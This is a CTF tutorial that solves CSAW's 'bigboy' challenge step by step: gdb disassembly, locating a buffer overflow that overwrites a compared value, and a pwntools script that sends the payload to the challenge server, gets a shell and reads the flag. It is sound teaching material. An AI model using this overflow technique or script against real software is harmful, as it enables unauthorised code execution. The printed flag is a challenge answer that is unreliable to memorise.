# Pwn Tools Introduction

May want to `pip` install pwn tools

> $ pip install pwntools

Pip varies from system to system so we may want to ask for help.

## Todays Lesson
This lesson is inspired by CSAW's bigboy challenge. It will involve some reversing with the debugger and then a building a script that will connect via netcat and complete the challenge.

## So get the binary `boi` from the slack.
A binary is an executable that is usually input/output.

To run a binary you use a `./` before the name.

However when we try it we get an error????
```
$ ./boi
The file './boi' is not executable by this user
```

Why is that?

Well the answer is below but here are some lessons about e`x`ecuteable. When I type:

```
$ ls -l
-rw-r--r--@ 1 user  8792 Oct 8 08:59 boi
```
What is the `-rw-r--r--`? That is the permissions of the file.

The first dash means is for directory or special types of files (as of now it is not import). The next three characters are for the user and they represent the read, write, and `execution` permissions of the file. The next 3 are for the group and they have the same permissions in the same order. Then the last three are the permissions for everyone.

For the moment we only care about the user permission to execute so type:
```
$ chmod +x boi
$ ls -l
-rwxr-xr-x@ 1 user  8792 Oct 8 08:59 boi
```

Now try running it (you need to run it on linux or else it will give an error)

```
$ ./boi
Are you a big boiiiii??
yes
Thus Oct 11 12:45:55 EDT 2018
```

Nothing really happens so lets debug it.
```
$ gdb -q ./boi
```

`gdb` is the general debugger and we use this to examine the disassembly of the file

so in gdb:
```
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400641 <+0>:	push   rbp
   0x0000000000400642 <+1>:	mov    rbp,rsp
   0x0000000000400645 <+4>:	sub    rsp,0x40
   0x0000000000400649 <+8>:	mov    DWORD PTR [rbp-0x34],edi
   0x000000000040064c <+11>:	mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000400650 <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400659 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040065d <+28>:	xor    eax,eax
   0x000000000040065f <+30>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000400667 <+38>:	mov    QWORD PTR [rbp-0x28],0x0
   0x000000000040066f <+46>:	mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000400677 <+54>:	mov    DWORD PTR [rbp-0x18],0x0
   0x000000000040067e <+61>:	mov    DWORD PTR [rbp-0x1c],0xdeadbeef
   0x0000000000400685 <+68>:	mov    edi,0x400764
   0x000000000040068a <+73>:	call   0x4004d0 <puts@plt>
   0x000000000040068f <+78>:	lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:	mov    edx,0x18
   0x0000000000400698 <+87>:	mov    rsi,rax
   0x000000000040069b <+90>:	mov    edi,0x0
   0x00000000004006a0 <+95>:	call   0x400500 <read@plt>
   0x00000000004006a5 <+100>:	mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:	cmp    eax,0xcaf3baee
   0x00000000004006ad <+108>:	jne    0x4006bb <main+122>
   0x00000000004006af <+110>:	mov    edi,0x40077c
   0x00000000004006b4 <+115>:	call   0x400626 <run_cmd>
   0x00000000004006b9 <+120>:	jmp    0x4006c5 <main+132>
   0x00000000004006bb <+122>:	mov    edi,0x400786
   0x00000000004006c0 <+127>:	call   0x400626 <run_cmd>
   0x00000000004006c5 <+132>:	mov    eax,0x0
   0x00000000004006ca <+137>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004006ce <+141>:	xor    rcx,QWORD PTR fs:0x28
   0x00000000004006d7 <+150>:	je     0x4006de <main+157>
   0x00000000004006d9 <+152>:	call   0x4004e0 <__stack_chk_fail@plt>
   0x00000000004006de <+157>:	leave  
   0x00000000004006df <+158>:	ret    
End of assembler dump.
```

This is the disassembly for the the main function (which is the only important function)

I ran this through `radare2` (which is pre-installed kali and need to install on ubuntu). This disassembles it and adds some commentary such as that the command `0x40077c` is for `/bin/bash`. So our goal is to execute that code.

The `0x40077c` is on line `<+110>`, and going up the command structure we see:
```asm
cmp    eax,0xcaf3baee
jne    0x4006bb <main+122>
```
This compares the the value in `eax` in to `0xcaf3baee` and jumps if it is not equal (`jne`). We don't want it to jump.

So looking at attack vectors there is the input. To test how much we need to overflow the buffer we use a a break point at `<+103>`.
```
(gdb) break *main+103
Breakpoint 1 at 0x4006a8
(gdb) run
Starting program: /root/InfoSec-Lessons/boi 
Are you a big boiiiii??
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Breakpoint 1, 0x00000000004006a8 in main ()
(gdb) GGGGHHHH
Undefined command: "GGGGHHHH".  Try "help".
(gdb) i r eax
eax            0x46464646	1179010630
(gdb)
```
`0x46` is the value F so that means the 4 Fs are our payload

Run it again:
```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/InfoSec-Lessons/boi 
Are you a big boiiiii??
AAAABBBBCCCCDDDDEEEEabcd

Breakpoint 1, 0x00000000004006a8 in main ()
(gdb) 
(gdb) i r eax
eax            0x64636261	1684234849
(gdb)
```

The `0x64` is the value for `d` that means little endian. Great lets try our exploit.

So our exploit is `"A" + "\xee\xba\xf3\xca"`

Now we need to deliver it through netcat. 
`nc pwn.chal.csaw.io 9000`

So we need pwn tools to do this. Specifically the remote command

The result is:
```python
from pwn import *
import string

r = remote('pwn.chal.csaw.io', 9000)
print r.recvuntil('Are you a big boiiiii??')


print r.send("aaaabbbbccccddddeeee\xee\xba\xf3\xca")

print r.recv()

r.interactive()
```

Now lets try it out

```
> python big_pwn.py
[+] Opening connection to pwn.chal.csaw.io on port 9000: Done
 _    ___        ____   ___  _ _ _ _ 
| |__|_ _|__ _  | __ ) / _ \(_|_|_|_)
| '_ \| |/ _` | |  _ \| | | | | | | |
| |_) | | (_| | | |_) | |_| | | | | |
|_.__/___\__, | |____/ \___/|_|_|_|_|
         |___/                       
***************************************
Are you a big boiiiii??
None


[*] Switching to interactive mode
aaaabbbbccccddddeeee����ls
ls
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bigboy@52c491e1e9ec:~$ ls
art.txt  boi  flag.txt  run.sh
bigboy@52c491e1e9ec:~$ $ cat flag.txt
cat flag.txt
flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
```

There is the flag

